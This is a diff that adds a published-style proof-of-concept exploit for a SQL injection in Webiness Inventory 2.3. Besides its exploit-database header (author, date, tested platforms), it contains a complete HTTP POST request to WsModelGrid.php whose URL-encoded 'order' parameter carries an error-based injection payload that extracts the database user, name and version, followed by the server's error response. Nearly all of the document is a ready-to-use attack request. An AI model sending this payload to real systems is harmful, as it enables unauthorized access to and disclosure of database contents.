@@ -1,0 +1,32 @@
+# Exploit Title: Webiness Inventory 2.3 - SQL Injection
+# Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://github.com/webiness/webiness_inventory
+# Software Link: https://kent.dl.sourceforge.net/project/webinessinventory/2.3/webiness_inventory-2.3.zip
+# Version: 2.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/protected/library/ajax/WsModelGrid.php
+# 
+POST /[PATH]/protected/library/ajax/WsModelGrid.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 541
+model=PartnerModel&order=%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%32%3d%32%2c%31%29%29%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29
+HTTP/1.1 500 Internal Server Error
+Date: Sun, 11 Nov 2018 16:16:54 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 315
+Connection: close
+Content-Type: text/html; charset=UTF-8
